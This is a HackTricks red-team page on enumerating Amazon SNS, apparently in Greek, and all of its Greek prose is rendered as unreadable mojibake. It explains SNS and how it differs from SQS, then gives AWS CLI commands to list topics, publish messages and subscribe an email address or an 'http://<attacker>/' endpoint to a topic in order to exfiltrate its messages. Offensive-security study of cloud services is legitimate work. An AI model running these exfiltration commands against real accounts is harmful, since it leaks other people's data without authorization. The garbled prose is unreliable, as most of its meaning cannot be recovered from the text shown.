# AWS - SNS Enum

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}

## SNS

Î— Amazon Simple Notification Service (Amazon SNS) Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ Ï‰Ï‚ Î¼Î¹Î± **Ï€Î»Î®ÏÏ‰Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½**. Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„ÏŒÏƒÎ¿ **ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚-Ï€ÏÎ¿Ï‚-ÎµÏ†Î±ÏÎ¼Î¿Î³Î®** (A2A) ÏŒÏƒÎ¿ ÎºÎ±Î¹ **ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚-Ï€ÏÎ¿Ï‚-Î¬Ï„Î¿Î¼Î¿** (A2P).

Î¤Î± Î²Î±ÏƒÎ¹ÎºÎ¬ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Î³Î¹Î± Ï„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± A2A Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ **Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼Î¿ÏÏ‚ Î´Î·Î¼Î¿ÏƒÎ¯ÎµÏ…ÏƒÎ·Ï‚/ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚ (pub/sub)**. Î‘Ï…Ï„Î¿Î¯ Î¿Î¹ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼Î¿Î¯ ÎµÎ¹ÏƒÎ¬Î³Î¿Ï…Î½ **Î¸Î­Î¼Î±Ï„Î±**, Ï„Î± Î¿Ï€Î¿Î¯Î± ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î± Î³Î¹Î± Ï„Î·Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï…ÏˆÎ·Î»Î®Ï‚ Î±Ï€ÏŒÎ´Î¿ÏƒÎ·Ï‚, **push-based, many-to-many messaging**. Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÎµÎ¯Î½Î±Î¹ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ± Ï€Î»ÎµÎ¿Î½ÎµÎºÏ„Î¹ÎºÏŒ ÏƒÎµ ÏƒÎµÎ½Î¬ÏÎ¹Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ ÎºÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î±, Î¼Î¹ÎºÏÎ¿Ï‹Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ ÎºÎ±Î¹ Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ­Ï‚ Ï‡Ï‰ÏÎ¯Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ Ï€Î¿Ï… Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ Î³ÎµÎ³Î¿Î½ÏŒÏ„Î±. ÎœÎµ Ï„Î·Î½ Î±Î¾Î¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î¸ÎµÎ¼Î¬Ï„Ï‰Î½, Ï„Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Î´Î·Î¼Î¿ÏƒÎ¯ÎµÏ…ÏƒÎ·Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î´Î¹Î±Î½Î­Î¼Î¿Ï…Î½ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬ Î¼Î·Î½ÏÎ¼Î±Ï„Î± ÏƒÎµ Î­Î½Î± **ÎµÏ…ÏÏ Ï†Î¬ÏƒÎ¼Î± ÏƒÏ…ÏƒÏ„Î·Î¼Î¬Ï„Ï‰Î½ ÏƒÏ…Î½Î´ÏÎ¿Î¼Î·Ï„ÏÎ½**, Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Î¼Î¿Ï„Î¯Î²Î¿ Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½ fanout.

### **Î”Î¹Î±Ï†Î¿ÏÎ¬ Î¼Îµ SQS**

Î¤Î¿ **SQS** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î· ÏƒÎµ Î¿Ï…ÏÎ¬** Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± ÏƒÎ·Î¼ÎµÎ¯Î¿-Ï€ÏÎ¿Ï‚-ÏƒÎ·Î¼ÎµÎ¯Î¿, Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Ï„Î± Î¼Î·Î½ÏÎ¼Î±Ï„Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î±Î½ **Î¼Î¿Î½Î±Î´Î¹ÎºÏŒ ÎºÎ±Ï„Î±Î½Î±Î»Ï‰Ï„Î®**. Î ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ **Ï€Î±ÏÎ¬Î´Î¿ÏƒÎ· Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ Î¼Î¯Î± Ï†Î¿ÏÎ¬**, Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„Ï…Ï€Î¹ÎºÎ­Ï‚ ÎºÎ±Î¹ FIFO Î¿Ï…ÏÎ­Ï‚, ÎºÎ±Î¹ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î´Î¹Î±Ï„Î®ÏÎ·ÏƒÎ· Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½ Î³Î¹Î± ÎµÏ€Î±Î½Î±Î»Î®ÏˆÎµÎ¹Ï‚ ÎºÎ±Î¹ ÎºÎ±Î¸Ï…ÏƒÏ„ÎµÏÎ·Î¼Î­Î½Î· ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î±.\
Î‘Ï€ÏŒ Ï„Î·Î½ Î¬Î»Î»Î· Ï€Î»ÎµÏ…ÏÎ¬, Ï„Î¿ **SNS** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î· ÏƒÎµ Î´Î·Î¼Î¿ÏƒÎ¯ÎµÏ…ÏƒÎ·/ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®**, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ **ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î­Î½Î±Ï‚-Ï€ÏÎ¿Ï‚-Ï€Î¿Î»Î»Î¿ÏÏ‚** Î¼Îµ Ï„Î·Î½ ÎµÎºÏ€Î¿Î¼Ï€Î® Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½ ÏƒÎµ **Ï€Î¿Î»Î»Î±Ï€Î»Î¿ÏÏ‚ ÏƒÏ…Î½Î´ÏÎ¿Î¼Î·Ï„Î­Ï‚** Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Î±. Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ **Î´Î¹Î¬Ï†Î¿ÏÎ± ÏƒÎ·Î¼ÎµÎ¯Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚ ÏŒÏ€Ï‰Ï‚ email, SMS, Lambda functions, ÎºÎ±Î¹ HTTP/HTTPS**, ÎºÎ±Î¹ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼Î¿ÏÏ‚ Ï†Î¹Î»Ï„ÏÎ±ÏÎ¯ÏƒÎ¼Î±Ï„Î¿Ï‚ Î³Î¹Î± ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î· Ï€Î±ÏÎ¬Î´Î¿ÏƒÎ· Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½.\
Î•Î½Ï ÎºÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏÎ½Î´ÎµÏƒÎ· Î¼ÎµÏ„Î±Î¾Ï Ï„Ï‰Î½ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Ï‰Î½ ÏƒÎµ ÎºÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î±, Ï„Î¿ SQS ÎµÏ€Î¹ÎºÎµÎ½Ï„ÏÏÎ½ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼Î­ÏƒÏ‰ Î¿Ï…ÏÎ¬Ï‚, ÎµÎ½Ï Ï„Î¿ SNS Î´Î¯Î½ÎµÎ¹ Î­Î¼Ï†Î±ÏƒÎ· ÏƒÎµ Î¼Î¿Ï„Î¯Î²Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±Ï‚ Ï€Î¿Ï… Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ Î³ÎµÎ³Î¿Î½ÏŒÏ„Î± ÎºÎ±Î¹ fan-out.

### **Enumeration**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Ï„Î¿ **topic ÎµÎ¯Î½Î±Î¹ Ï„ÏÏ€Î¿Ï… FIFO**, Î¼ÏŒÎ½Î¿ Î¿Î¹ ÏƒÏ…Î½Î´ÏÎ¿Î¼Î·Ï„Î­Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ **SQS** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ (HTTP Î® HTTPS Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½).

Î•Ï€Î¯ÏƒÎ·Ï‚, Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ Ï„Î¿ `--topic-arn` Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î·Î½ Ï€ÎµÏÎ¹Î¿Ï‡Î®, Î²ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î­Ï‡ÎµÏ„Îµ ÎºÎ±Î¸Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î· ÏƒÏ‰ÏƒÏ„Î® Ï€ÎµÏÎ¹Î¿Ï‡Î® ÏƒÏ„Î¿ **`--region`** Î±Î»Î»Î¹ÏÏ‚ Î¸Î± Î»Î¬Î²ÎµÏ„Îµ Î­Î½Î± ÏƒÏ†Î¬Î»Î¼Î± Ï€Î¿Ï… Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·, Î±Î»Î»Î¬ Ï„Î¿ Ï€ÏÏŒÎ²Î»Î·Î¼Î± ÎµÎ¯Î½Î±Î¹ Î· Ï€ÎµÏÎ¹Î¿Ï‡Î®.
{% endhint %}

#### ÎœÎ· Î‘Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î ÏÏŒÏƒÎ²Î±ÏƒÎ·

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### ÎšÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### ÎœÎµÏ„Î±-Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### Î•Î¼Î¼Î¿Î½Î®

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}
